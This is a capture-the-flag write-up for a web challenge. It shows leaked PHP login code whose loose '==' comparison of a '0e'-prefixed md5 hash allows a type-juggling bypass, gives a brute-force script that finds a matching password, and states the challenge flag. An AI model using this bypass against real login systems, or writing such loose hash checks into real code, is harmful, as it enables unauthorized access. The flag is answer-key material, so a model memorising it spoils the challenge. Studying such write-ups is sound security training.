# WM03
> 250pts

## Briefing
> Visit the site at https://cfta-wm03.allyourbases.co and find a way to bypass the password check.

## Solution
Head straight to the source (literally)! In the index, we spy a *suspicious* piece of code that someone made a mistake of leaving on the client-side.

```html
<!--
TODO: remove, taken from OSS project, login contains:
return function ($event) {
    require_once("flag.php");
    $hash = "0e747135815419029880333118591372";
    $salt = "e361bfc569ba48dc";
    if (isset($event['password']) && is_string($event['password'])) {
        if (md5($salt . $event['password']) == $hash) {
            return $flag;
        }
    }
    return "Incorrect";
};
-->
```

It appears that the backend is PHP, which checks the password hashed with md5 and a salt against `$hash` and `$salt`.

> **IMPORTANT**: The hash starts with `0e`, which means that tthis is susceptible to a [**PHP 0e hash collision**](https://www.programmersought.com/article/91383171689/) AND the comparison `==` is used.

To brute force the value that matches up with `$hash` after its hashed with md5 + salt (to find the collision), I wrote a quick script:
```php
<?php
$i = 0;
$hash = "0e747135815419029880333118591372";
$salt = "e361bfc569ba48dc";
do{
    $i++;
} while(md5($salt . $i) != $hash);
echo $i;
?>
```
After a few seconds, the program spits out `15896119`, which allows us to circumvent the password-checking and login!

![loggedin](https://user-images.githubusercontent.com/69332964/113915288-9b439a00-97ac-11eb-895b-8a8f750767fe.png)

## Flag
Flag: `theLOOSEtheMATH&theTRUTHY`
